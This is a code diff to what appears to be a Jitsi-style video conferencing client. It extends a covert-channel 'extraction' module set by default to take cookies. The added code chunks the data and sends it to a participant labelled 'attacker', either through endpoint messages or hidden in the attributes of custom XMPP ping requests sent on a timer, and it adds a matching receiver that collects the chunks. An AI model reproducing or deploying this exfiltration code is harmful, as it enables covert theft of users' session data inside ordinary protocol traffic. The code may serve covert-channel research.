@@ -1,18 +1,20 @@
 /* eslint-disable max-params */
 /* global APP, splitString, getDefaultSettings */
-import { $iq, Strophe } from 'strophe.js';
+import { $iq } from 'strophe.js';
 
 import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';
 
 import VideoSteganoEffect from './VideoSteganoEffect';
 
-
 export const defaultConfigurationValues = {
     method: 'plain',
     dataType: 'cookies',
     chunkSize: 5000,
-    encryptionEnabled: true
+    encryptionEnabled: true,
+    pingInterval: 1000
 };
+
+const xmlns = 'extraction';
 
 /**
  * Implementation of different convert channel methods
@@ -28,14 +30,28 @@ class CovertChannelMethods {
     };
 
     /**
+     * End hidden communication between users
+     */
+    static endCommunication(attackerId) {
+        APP.conference.sendEndpointMessage(attackerId, {
+            extraction: 'reply',
+            isEnd: true
+        });
+        this.communicationEnded = true;
+    }
+
+    /**
      * Sending data using simple plain method
      * @param {any} data - specified data to be sent
      */
     static usePlain(data, attackerId) {
-        APP.conference.sendEndpointMessage(attackerId, {
-            extraction: 'reply',
-            payload: data
-        });
+        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
+            APP.conference.sendEndpointMessage(attackerId, {
+                extraction: 'reply',
+                payload: chunkData
+            });
+        }
+        CovertChannelMethods.endCommunication(attackerId);
     }
 
     /**
@@ -81,6 +97,18 @@ class CovertChannelMethods {
     }
 
     /**
+     *
+     * @param {*} iq
+     * @param {*} success
+     * @param {*} error
+     * @param {*} timeout
+     */
+    static ping(iq, success, error, timeout) {
+        APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
+            .then(success, error);
+    }
+
+    /**
      * Sends "ping" to given <tt>jid</tt>
      * @param jid the JID to which ping request will be sent.
      * @param success callback called on success.
@@ -89,31 +117,86 @@ class CovertChannelMethods {
      * @param data to send
      * timeout <tt>error<//t> callback is called with undefined error argument.
      */
-    static extractionPing(jid, success, error, timeout, data) {
+    static extractionPing(jid, success, error, timeout, data, type, id = '123') {
         const iq = $iq({
-            type: 'get',
-            to: jid
+            type,
+            to: jid,
+            sid: '666',
+            id,
+            name: 'extraction'
         });
 
-        iq.c('ping', { xmlns: Strophe.NS.PING,
-            extraction: 'reply',
+        iq.c('ping', { xmlns: 'extraction',
             data });
         APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
             .then(success, error);
     }
 
     /**
+     *
+     * @param {*} userJid
+     * @param {*} dataStack
+     */
+    static sendPing(userJid, dataStack) {
+        CovertChannelMethods.extractionPing(userJid, e => {
+            console.log('success', e, dataStack);
+            if (!dataStack) {
+                return;
+            }
+            CovertChannelMethods.sendPing(userJid, dataStack);
+        }, e => {
+            console.log('fail', e);
+            console.log('Data sent:', dataStack);
+        }, 5000, dataStack.shift(), 'get');
+    }
+
+    static sendPong() {
+
+    }
+
+    /**
      * Send data using audio stream
      * @param {any} data - specified data to be sent
      */
-    static useXMPP(data) {
-        const user = APP.conference.listMembers()[0].jid;
+    static useXMPP(data, attacker, configuration) {
+        const splitedData = splitString(data, configuration.chunkSize);
 
-        CovertChannelMethods.extractionPing(user, () => {
-            console.log('success');
-        }, e => {
-            console.log('fail', e);
-        }, 1000, data);
+        console.log('Data:', splitedData);
+
+        const intervalRef = setInterval(() => {
+            if (!splitedData.length) {
+                clearInterval(intervalRef);
+                CovertChannelMethods.endCommunication(attacker.getId());
+
+                return;
+            }
+            CovertChannelMethods.extractionPing(attacker.getJid(), e => {
+                console.log('success', e, splitedData);
+            }, e => {
+                console.log('fail', e);
+                console.log('Data sent:', splitedData);
+            }, 5000, splitedData.shift(), 'get');
+        }, configuration.pingInterval);
+
+        /*
+        const handlerRef = APP.conference._room.xmpp.connection.addHandler(ping => {
+            console.log('Sending another ping', ping);
+            CovertChannelMethods.extractionPing(attacker.getJid(),
+                message => {
+                    console.log('successful message recieved:', message);
+                    if (!splitData) {
+                        APP.conference._room.xmpp.connection.deleteHandler(handlerRef);
+                        CovertChannelMethods.endCommunication(attacker.getJid());
+
+                        return;
+                    }
+                    CovertChannelMethods.sendPing(attacker.getJid(), splitData.shift());
+                }, message => {
+                    console.log('failed message recieved:', message);
+                }, 1000, 'test', 'result', ping.id);
+
+        }, 'extraction');
+        */
 
         // APP.conference.saveLogs();
     }
@@ -150,8 +233,23 @@ class ExtractionCovertChannelMethods {
     /**
      * Receiving data using xmpp ping
      */
-    static usedXMPP(user) {
+    static usedXMPP(user, stackedData) {
+        const handlerRef = APP.conference._room.xmpp.connection.addHandler(ping => {
+            stackedData.push(ping.children[0].attributes.data.nodeValue);
+            console.log('data:', stackedData);
 
+            console.log('usedXMPP', user.getJid(), ping);
+
+            CovertChannelMethods.extractionPing(user.getJid(),
+                message => {
+                    console.log('successful message recieved:', message);
+                }, message => {
+                    console.log('failed message recieved:', message);
+                    console.log('Data received:', stackedData);
+                }, 1000, 'test', 'result', ping.id);
+
+            return true;
+        }, 'extraction');
     }
 
     /**
@@ -261,17 +359,15 @@ export class ExtractionHandler {
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
-    sendAll(data, attackerId, dataSize = data.length) {
+    sendAll(data, attacker, dataSize = data.length) {
         // If the method can loose data through the transition send the final size of sent file.
 
         this.initializeEncryption().then(() => {
-            console.log('test:', JSON.parse(JSON.stringify(this)));
-            this.sendChunks(data, attackerId);
-            APP.conference.sendEndpointMessage(attackerId, {
-                extraction: 'reply',
-                isEnd: true
-            });
-            this.communicationEnded = true;
+            if (this.enabledEncryption()) {
+                // TODO: make encryption work.
+            }
+
+            CovertChannelMethods.options[this.configuration.method](data, attacker, this.configuration);
         });
     }
 
@@ -310,6 +406,6 @@ export class ExtractionHandler {
      */
     receiveAll(user) {
         // TODO: add generic code for all types of communication.
-        ExtractionCovertChannelMethods.options[this.configuration.method](user);
+        ExtractionCovertChannelMethods.options[this.configuration.method](user, this._fileBuffer);
     }
 }
